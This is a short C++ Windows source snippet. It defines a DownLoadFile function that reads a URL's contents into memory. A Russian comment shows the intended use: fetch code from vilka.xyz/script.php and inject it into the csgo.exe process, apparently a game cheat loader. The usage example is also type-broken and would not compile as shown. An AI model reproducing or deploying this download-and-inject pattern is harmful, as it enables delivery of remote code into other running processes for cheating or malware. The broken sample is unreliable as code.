int DownLoadFile(LPCSTR lpszURL, BYTE **ppBuffer, DWORD *pdwSize)
		{
			LPSTREAM lpStream = 0;
			BYTE *pResult = 0;
			int nResult = 0;

			if (lpszURL && SUCCEEDED(URLOpenBlockingStream(NULL, lpszURL, &lpStream, 0, NULL)))
			{
				STATSTG statStream;
				if (SUCCEEDED(lpStream->Stat(&statStream, STATFLAG_NONAME)))
				{
					DWORD dwSize = statStream.cbSize.LowPart;
					pResult = (BYTE *)malloc(dwSize);
					if (pResult)
					{
						LARGE_INTEGER liPos;
						ZeroMemory(&liPos, sizeof(liPos));
						lpStream->Seek(liPos, STREAM_SEEK_SET, NULL);
						lpStream->Read(pResult, dwSize, NULL);
						*ppBuffer = pResult;
						*pdwSize = dwSize;
						nResult = 1;
					}
				}
				lpStream->Release();
			}

			return nResult;
		}

/*
Как надо вилке использовать эту функцию?
BYTE bytes;
DWORD size;
DownLoadFile("http://vilka.xyz/script.php", &bytes, &size);
Inject("csgo.exe", bytes);
*/